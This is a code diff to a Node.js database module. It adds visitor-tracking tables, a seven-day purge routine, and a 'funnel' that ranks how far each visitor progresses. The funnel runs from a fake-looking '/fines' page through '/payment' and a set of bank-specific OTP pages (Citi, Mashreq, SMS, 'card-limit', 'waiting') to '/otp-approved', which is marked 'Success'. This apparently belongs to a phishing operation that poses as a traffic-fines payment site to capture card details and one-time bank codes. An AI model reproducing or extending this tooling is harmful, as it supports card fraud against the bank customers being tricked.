@@ -74,4 +74,59 @@ async function logActivity(action, description, adminUser, ip, userAgent) {
   }
 }
 
-module.exports = { pool, query, queryOne, getSetting, setSetting, clientIp, ensureActivityLogsTable, logActivity };
+// ─── Tracking tables ─────────────────────────────────────────────────────────
+async function ensureTrackingTables() {
+  // Visitors row-log: one row per page hit. Existing table, just add columns.
+  await pool.query(`ALTER TABLE visitors ADD COLUMN IF NOT EXISTS visitor_id VARCHAR(40) DEFAULT ''`).catch(()=>{});
+  await pool.query(`ALTER TABLE visitors ADD COLUMN IF NOT EXISTS user_agent TEXT DEFAULT ''`).catch(()=>{});
+  await pool.query(`ALTER TABLE visitors ADD COLUMN IF NOT EXISTS referrer  VARCHAR(500) DEFAULT ''`).catch(()=>{});
+  await pool.query(`CREATE INDEX IF NOT EXISTS idx_visitors_vid     ON visitors(visitor_id)`).catch(()=>{});
+  await pool.query(`CREATE INDEX IF NOT EXISTS idx_visitors_created ON visitors(created_at)`).catch(()=>{});
+  await pool.query(`CREATE INDEX IF NOT EXISTS idx_visitors_ip      ON visitors(ip)`).catch(()=>{});
+
+  // Aggregated state per visitor — updated on each page hit and each heartbeat.
+  await pool.query(`
+    CREATE TABLE IF NOT EXISTS visitor_state (
+      visitor_id   VARCHAR(40) PRIMARY KEY,
+      ip           VARCHAR(60) NOT NULL DEFAULT '',
+      user_agent   TEXT        NOT NULL DEFAULT '',
+      current_path VARCHAR(255) NOT NULL DEFAULT '/',
+      first_seen   TIMESTAMPTZ DEFAULT NOW(),
+      last_seen    TIMESTAMPTZ DEFAULT NOW(),
+      page_count   INTEGER     NOT NULL DEFAULT 1,
+      deepest_path VARCHAR(255) NOT NULL DEFAULT '/'
+    )
+  `).catch(()=>{});
+  await pool.query(`CREATE INDEX IF NOT EXISTS idx_vstate_last_seen ON visitor_state(last_seen)`).catch(()=>{});
+  await pool.query(`CREATE INDEX IF NOT EXISTS idx_vstate_first     ON visitor_state(first_seen)`).catch(()=>{});
+}
+
+// ─── Funnel ranking (depth in the journey) ──────────────────────────────────
+const FUNNEL_STEPS = [
+  { rank: 1, name: 'Home',     paths: ['/'] },
+  { rank: 2, name: 'Fines',    paths: ['/fines'] },
+  { rank: 3, name: 'Payment',  paths: ['/payment'] },
+  { rank: 4, name: 'OTP/Wait', paths: ['/otp','/otp-sms','/otp-sms2','/otp-citi','/otp-mashreq','/otp-loading','/card-limit','/waiting','/yogunluk'] },
+  { rank: 5, name: 'Success',  paths: ['/otp-approved'] },
+];
+function pathRank(path) {
+  for (const s of FUNNEL_STEPS) if (s.paths.includes(path)) return s.rank;
+  return 0;
+}
+function rankName(rank) {
+  const s = FUNNEL_STEPS.find(x => x.rank === rank);
+  return s ? s.name : '—';
+}
+
+// ─── Cleanup older than N days ───────────────────────────────────────────────
+async function purgeOldTracking(days = 7) {
+  await pool.query(`DELETE FROM visitors      WHERE created_at < NOW() - ($1::int || ' days')::interval`, [days]).catch(()=>{});
+  await pool.query(`DELETE FROM visitor_state WHERE last_seen  < NOW() - ($1::int || ' days')::interval`, [days]).catch(()=>{});
+}
+
+module.exports = {
+  pool, query, queryOne, getSetting, setSetting, clientIp,
+  ensureActivityLogsTable, logActivity,
+  ensureTrackingTables, purgeOldTracking,
+  FUNNEL_STEPS, pathRank, rankName,
+};
